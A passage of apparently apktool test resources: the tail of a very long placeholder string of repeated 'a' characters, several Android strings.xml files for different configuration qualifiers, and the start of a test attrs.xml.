aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-notround/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-nowidecg-v26/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-round/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-vrheadset-v26/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-watch/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="test1">test1</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values-widecg-v26/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/testapp/res/values/attrs.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <attr name="test_attr0"/>
    <attr format="integer" name="test_attr1"/>
    <attr format="reference" name="test_attr2"/>
    <attr format="reference" name="test_attr3"/>
    <attr format="string" name="test_attr4"/>
    <attr name="test_attr5">
        <enum name="out_test" value="0"/>
        <enum name="in_test" value="1"/>
    </attr>
    <attr format="reference" name="test_attr6"/>
    <attr format="reference" name="test_attr7"/>
    <attr format="color|reference" name="test_attr8"/>
    <attr format="color" name="test_attr9"/>
    <attr format="boolean" name="test_attr10"/>
    <attr name="test_attr11">
        <enum name="TEST_ZERO" value="0" />
        <enum name="TEST_ONE" value="1" />
    </attr>
    <attr name="min_value" format="float" />
    <attr name="max_value" format="float" />
